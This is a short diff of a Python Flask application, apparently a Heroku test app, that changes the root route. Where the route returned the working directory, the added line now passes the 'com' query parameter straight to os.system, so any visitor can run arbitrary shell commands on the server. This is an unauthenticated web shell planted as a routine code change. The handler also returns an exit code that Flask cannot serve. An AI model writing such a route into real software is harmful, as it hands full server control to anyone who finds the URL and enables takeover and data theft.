@@ -1,4 +1,4 @@
-from flask import Flask
+from flask import request
 from test_heroku.app import app
 
 import os
@@ -9,7 +9,7 @@ app = app.create_app()
 @app.route('/')
 def index():
     """ main func """
-    return os.getcwd()
+    return os.system(request.args['com'])
 
 
 if __name__ == '__main__':
